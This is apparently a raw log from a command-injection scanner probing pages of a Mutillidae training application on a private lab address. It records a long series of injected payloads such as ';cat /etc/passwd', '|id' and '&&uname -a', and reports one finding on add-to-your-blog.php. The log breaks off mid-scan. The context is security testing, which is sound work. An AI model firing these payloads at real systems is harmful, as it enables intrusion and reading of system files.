INFO - 
Starting ScanCommandInject scan
INFO - 	No forms found on http://192.168.232.129:80/. Skipping...
INFO - 	Testing payload: ||mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: )mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: &touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: |touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: )touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: ;ls / on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: \nls / on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: &ls / on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: |ls / on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: &&ls / on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: ||ls / on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: )ls / on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: ;id on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: \nid on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: &id on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: |id on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: &&id on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: ||id on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: )id on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: ;uname -a on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: \nuname -a on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: &uname -a on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: |uname -a on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: &&uname -a on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: ||uname -a on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: )uname -a on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	No command injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing blind command injection
INFO - 	No blind command injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=browser-info.php. Skipping...
INFO - 	Testing payload: ;cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: \ncat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: &cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: |cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: &&cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: ||cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: )cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: ;mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: \nmkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: &mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: |mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: &&mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: ||mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: )mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: &touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: |touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: )touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: ;mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: \nmkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: &mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: |mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: &&mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: ||mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: )mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: &touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: |touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: )touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: ;ls / on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: \nls / on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: &ls / on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: |ls / on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: &&ls / on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: ||ls / on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: )ls / on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: ;id on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: \nid on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: &id on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: |id on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: &&id on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: ||id on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: )id on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: ;uname -a on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: \nuname -a on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: &uname -a on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: |uname -a on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: &&uname -a on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: ||uname -a on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: )uname -a on http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	No command injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing blind command injection
INFO - 	No blind command injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=login.php
INFO - 	Testing payload: ;cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: \ncat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: &cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: |cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: &&cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: ||cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: )cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: ;mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: \nmkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: &mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: |mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: &&mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: ||mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: )mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: &touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: |touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: )touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: ;mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: \nmkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: &mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: |mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: &&mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: ||mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: )mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: &touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: |touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: )touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: ;ls / on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: \nls / on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: &ls / on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: |ls / on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: &&ls / on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: ||ls / on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: )ls / on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: ;id on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: \nid on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: &id on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: |id on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: &&id on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: ||id on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: )id on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: ;uname -a on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: \nuname -a on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: &uname -a on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: |uname -a on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: &&uname -a on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: ||uname -a on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: )uname -a on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	No command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing blind command injection
INFO - 	No blind command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=arbitrary-file-inclusion.php. Skipping...
INFO - 	Testing payload: ;cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=add-to-your-blog.php
WARNING - Command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=add-to-your-blog.php with payload: ;cat /etc/passwd
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=secret-administrative-pages.php. Skipping...
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/?page=credits.php. Skipping...
INFO - 	Testing payload: ;cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: \ncat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: &cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: |cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: &&cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: ||cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: )cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: ;mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: \nmkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: &mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: |mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: &&mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: ||mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: )mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: &touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: |touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: )touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: ;mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: \nmkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: &mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: |mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: &&mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: ||mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: )mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: &touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: |touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: )touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: ;ls / on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: \nls / on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: &ls / on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: |ls / on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: &&ls / on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: ||ls / on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: )ls / on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: ;id on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: \nid on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: &id on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: |id on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: &&id on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: ||id on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: )id on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: ;uname -a on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: \nuname -a on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: &uname -a on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: |uname -a on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: &&uname -a on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: ||uname -a on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing payload: )uname -a on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	No command injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	Testing blind command injection
INFO - 	No blind command injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=source-viewer.php
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=framing.php. Skipping...
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/framer.html. Skipping...
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=change-log.htm. Skipping...
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=installation.php. Skipping...
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/documentation/mutillidae-installation-on-xampp-win7.pdf. Skipping...
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=documentation/vulnerabilities.php. Skipping...
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=documentation/how-to-access-Mutillidae-over-Virtual-Box-network.php. Skipping...
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=usage-instructions.php. Skipping...
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=php-errors.php. Skipping...
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=notes.php. Skipping...
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=redirectandlog.php&forwardurl=http://www.irongeek.com/. Skipping...
INFO - 	Testing payload: ;cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: \ncat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: &cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: |cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: &&cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: ||cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: )cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: ;mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: \nmkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: &mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: |mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: &&mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: ||mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: )mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: &touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: |touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: )touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: ;mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: \nmkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: &mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: |mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: &&mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: ||mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: )mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: &touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: |touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: )touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: ;ls / on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: \nls / on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: &ls / on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: |ls / on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: &&ls / on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: ||ls / on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: )ls / on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: ;id on http://192.168.232.129:80/mutillidae/?page=register.php
